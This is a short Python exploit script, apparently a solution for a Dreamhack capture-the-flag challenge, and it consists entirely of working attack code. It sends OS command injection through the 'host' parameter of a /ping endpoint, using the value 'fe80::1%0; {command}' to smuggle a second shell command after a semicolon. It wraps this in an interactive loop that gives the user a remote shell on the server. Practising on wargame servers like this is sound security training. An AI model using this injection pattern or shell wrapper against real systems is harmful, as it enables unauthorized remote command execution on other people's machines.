import requests

class Exploit:
    def __init__(self, baseURL):
        self.baseURL = baseURL
    def execute_command(self, command):
        payload = f"fe80::1%0; {command}"
        try:
            response = requests.get(f"{self.baseURL}/ping", params={"host":payload})
            return response.text
        except requests.RequestException as e:
            return f"[!] Request failed: {e}"
    def interative_shell(self):
        while True:
            cmd = input("shell > ")
            if cmd.lower() in ("quit", "exit"):
                print(f"[+] Bye")
                break
            output = self.execute_command(cmd)
            print(f"[+] Output Shell: \n{output}")

if __name__ == "__main__":
    BASE_URL = "http://host8.dreamhack.games:11108"
    exploit = Exploit(BASE_URL)
    exploit.interative_shell()